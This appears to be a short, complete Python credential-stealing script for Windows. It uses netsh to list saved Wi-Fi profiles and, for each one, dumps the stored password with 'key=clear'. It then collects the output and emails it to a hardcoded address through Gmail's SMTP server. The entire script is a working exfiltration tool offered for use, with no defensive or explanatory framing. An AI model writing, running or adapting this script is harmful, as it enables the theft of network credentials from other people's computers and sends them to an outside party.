#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  #google allow to send mail by their servers
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# for gmail you'll need to https://myaccount.google.com/lesssecureapps
command = "netsh wlan show profile"
network_result = subprocess.check_output(command, shell=True)
network_names = re.findall("(?<=:\s)(.*?)(?=\\\\r)", str(network_result)) # \\\\ to escape the \


results = ""

for network_name in network_names:
    current_result = subprocess.check_output("netsh wlan show profile "+network_name+" key=clear", shell=True)
    results = results + str(current_result)

results = results.replace("\\r\\n", "\n")


send_mail("email@mail.com", "password", "\n"+results)
